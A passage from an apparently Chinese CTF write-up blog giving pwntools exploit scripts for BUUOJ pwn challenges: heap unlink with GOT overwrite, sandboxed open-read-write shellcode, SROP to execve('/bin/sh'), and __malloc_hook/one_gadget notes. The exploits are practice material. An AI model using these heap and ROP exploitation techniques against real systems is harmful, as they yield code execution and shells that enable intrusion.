data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *0x0400D47'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'>>\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'1024)\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'content:\\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'note:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'note:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'content:\\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x6020C8</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>c3r <span class=\"token operator\">=</span> ptr<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token operator\">*</span><span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>free_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x91</span><span class=\"token punctuation\">,</span> c3r<span class=\"token operator\">-</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> c3r<span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span> <span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x98</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0xa0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span> <span class=\"token comment\">#4</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">change</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    edit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token comment\"># 3-> 0</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>change<span class=\"token punctuation\">(</span>free_g<span class=\"token punctuation\">,</span> puts_p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span> lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>change<span class=\"token punctuation\">(</span>free_g<span class=\"token punctuation\">,</span> sys_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwnable_asm\"><a class=\"markdownIt-Anchor\" href=\"#pwnable_asm\">#</a> pwnable_asm</h1>\n<p>** 考点：**shellcode, orw</p>\n<p>保护：</p>\n<p><img data-src=\"./image-20231128193217282.png\" alt=\"image-20231128193217282\"></p>\n<p>存在沙盒保护，只能使用 orw 三个系统调用。</p>\n<p><img data-src=\"./image-20231128193307592.png\" alt=\"image-20231128193307592\"></p>\n<p>输入没有限制，所以直接 orw。</p>\n<p>这边执行 shellcode 前会清空除了 rsp 以外的寄存器，所以这边将读入的 flag 放在 rsp-0x100 的地方。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=process('./asm')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28437</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b read')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>assem <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>mov rdx, &#123;&#125;</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>push 0</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>push rdx</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>mov rdi, rsp</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>xor rsi, rsi</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>xor rdx, rdx</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>mov rax, 0x2</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>syscall</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>mov rdi, 3</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>mov rsi, rsp</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>add rsi, 0x100</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>mov rdx, 0x30</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>xor rax, rax</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>syscall</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>mov rdi, 1</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>mov rax, 1</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>syscall</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>'''</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span><span class=\"token string\">b'flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'shellcode: '</span><span class=\"token punctuation\">,</span>asm<span class=\"token punctuation\">(</span>assem<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"rootersctf_2019_srop\"><a class=\"markdownIt-Anchor\" href=\"#rootersctf_2019_srop\">#</a> rootersctf_2019_srop</h1>\n<p>** 考点：**srop</p>\n<p>程序非常简单。可输入的字符串长度很大。</p>\n<p>题目没有直接调用 0xf 系统调用号的代码。但是程序在调用 read 系统调用时用的 <code>push 0; pop rax</code> ，我们可以利用这个 <code>pop rax</code>  以及构造 rop chain 实现 0xf 系统调用。</p>\n<p><img data-src=\"./image-20231128202901628.png\" alt=\"image-20231128202901628\"></p>\n<p>vmmap 查看可读写地址段，将栈迁移至 0x402900 处即可。</p>\n<p><img data-src=\"./image-20231128203036904.png\" alt=\"image-20231128203036904\"></p>\n<p>一次 read 的 sigreturn，一次 execve 的 sigreturn。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">.</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./rootersctf_2019_srop'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26979</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *0x40101f'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x080</span><span class=\"token operator\">+</span><span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>buf <span class=\"token operator\">=</span> <span class=\"token number\">0x402900</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>popsys <span class=\"token operator\">=</span> <span class=\"token number\">0x401032</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>syscall <span class=\"token operator\">=</span> <span class=\"token number\">0x401033</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>sig <span class=\"token operator\">=</span> SigreturnFrame<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0x300</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rsp <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rbp <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>popsys<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xf</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>sig<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>suspend<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>sig <span class=\"token operator\">=</span> SigreturnFrame<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> <span class=\"token number\">0x3b</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> buf<span class=\"token operator\">+</span><span class=\"token number\">0x200</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rsp <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>sig<span class=\"token punctuation\">.</span>rbp <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>popsys<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xf</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>  <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>sig<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x200</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'/bin/sh\\0'</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"houseoforange_hitcon_2016\"><a class=\"markdownIt-Anchor\" href=\"#houseoforange_hitcon_2016\">#</a> houseoforange_hitcon_2016</h1>\n<p><img data-src=\"./image-20231202155115909.png\" alt=\"image-20231202155115909\"></p>\n<p>0x7f8c6dbc56f8</p>\n<p>0x7F8C6DBC5188</p>\n<p>0x55DB6664B161</p>\n<p>1:0x7fd82bbc5188<br>\n2:0x5639f58c6161<br>\n0x00005639f58e8000</p>\n<p>0x7fd82bbc56f8</p>\n<h1 id=\"gyctf_2020_document\"><a class=\"markdownIt-Anchor\" href=\"#gyctf_2020_document\">#</a> gyctf_2020_document</h1>\n<p><strong>考点：</strong> overlap, heap</p>\n<p>** 版本：**libc-2.23_amd64</p>\n<p>这题保护全开。</p>\n<p>分配函数固定分配两个 chunk，分别为 <code>0x8(0x20)</code>  和 <code>0x80(0x90)</code>  的 chunk。0x8 的 chunk 储存 <code>0x80chunk</code>  的指针。结构大致如以下注释。</p>\n<p><img data-src=\"./image-20231204181819985.png\" alt=\"image-20231204181819985\"></p>\n<p>而 edit 函数允许编辑一次 <code>0x80chunk</code> ，是否编辑过取决于 <code>0x8chunk</code>  内 + 8 处的值。可以选择修改 + 8 处的值为固定的 0x10 或 0x1，或者 + 16 处任意写入 0x70 字节。</p>\n<p>释放函数只释放了 <code>0x80chunk</code> ，并且没有清空地址。0x90 的 chunk 属于 <code>unsortbin</code>  的范围。</p>\n<h2 id=\"思路-3\"><a class=\"markdownIt-Anchor\" href=\"#思路-3\">#</a> 思路</h2>\n<p>分配函数后释放，然后利用输出函数泄露 <code>unsortbin chunk</code>  的 <code>mainarena</code>  地址。由此计算出 <code>one_gadget</code>  和 <code>__malloc_hook</code>  的地址。</p>\n<p>然后继续分配 2 次。由于先分配的 <code>0x8chunk</code> ，会将刚刚释放的 chunk 分割。而此时再对第一次分配的 chunk 执行编辑函数，就可以修改该 <code>0x8chunk</code> ，从而可以利用编辑函数实现任意地址读写。</p>\n<p>老方法，修改 <code>__malloc_hook</code>  为 <code>one_gadget</code> 。这题需要 <code>realloc</code>  进行跳板，并且需要调整进入 <code>realloc</code>  函数的位置。</p>\n<p><img data-src=\"./image-20231204181304248.png\" alt=\"image-20231204181304248\"></p>\n<p><img data-src=\"./image-20231204180850418.png\" alt=\"image-20231204180850418\"></p>\n<p><img data-src=\"./image-20231204180931543.png\" alt=\"image-20231204180931543\"></p>\n<p>调用 <code>realloc</code>  前栈顶为 <code>0xb2c8</code>  位置，而 <code>realloc</code>  调用 <code>one_gadget</code>  时 <code>esp+0x70</code>  正好指向 <code>0xb2c8</code> ，因此只需要少 push 4 个数，让 <code>esp+0x70</code>  指向 <code>0xb2e8</code>  即可。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> 